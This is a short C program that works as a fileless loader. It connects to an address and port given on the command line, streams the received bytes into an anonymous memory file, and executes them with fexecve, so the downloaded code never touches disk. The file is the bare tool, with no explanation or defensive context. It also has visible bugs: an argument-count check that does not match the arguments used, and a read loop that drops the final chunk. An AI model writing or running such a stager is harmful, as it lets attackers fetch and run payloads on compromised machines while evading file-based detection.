#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define __NR_memfd_create 319
#define MFD_CLOEXEC 1

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

//extern char **environ;

int main(int argc, char* argv[]) {
    int s, fd;
    struct sockaddr_in addr;
    char buf[1024] = {0};
    char *args[2]= {"random-name", NULL};
    int count;

    if(argc < 2) exit(1);

    memset(&addr, 0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, argv[1], &addr.sin_addr) <= 0) exit(1);
    addr.sin_port = htons(atoi(argv[2]));

    if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) exit(1);
    if (connect(s, (struct sockaddr*)&addr, sizeof(struct sockaddr_in)) < 0) exit(1);

    if ((fd = memfd_create("random-name", MFD_CLOEXEC)) < 0) exit(1);

    while (1) {
      count = read(s, buf, sizeof(buf));
      if (count <= 0 || count < sizeof(buf))
          break;
      write(fd, buf, count);
    }
    close(s);

    if (fexecve(fd, args, NULL) < 0) exit(1);

    return 0;
}
